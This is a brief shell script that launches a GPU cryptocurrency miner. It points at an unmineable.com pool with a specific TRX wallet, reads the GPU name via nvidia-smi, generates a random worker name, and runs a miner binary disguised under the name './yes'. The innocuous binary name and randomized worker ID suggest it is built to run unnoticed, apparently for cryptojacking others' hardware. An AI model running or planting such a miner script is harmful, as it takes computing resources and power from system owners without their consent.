POOL=rx-us.unmineable.com:3333
WALLET=TRX:TF3LUss5DCDfx5QtJTbBpL8vRYHQREyJLE
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo xfMa3rHX-$(shuf -i 1911-327436 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
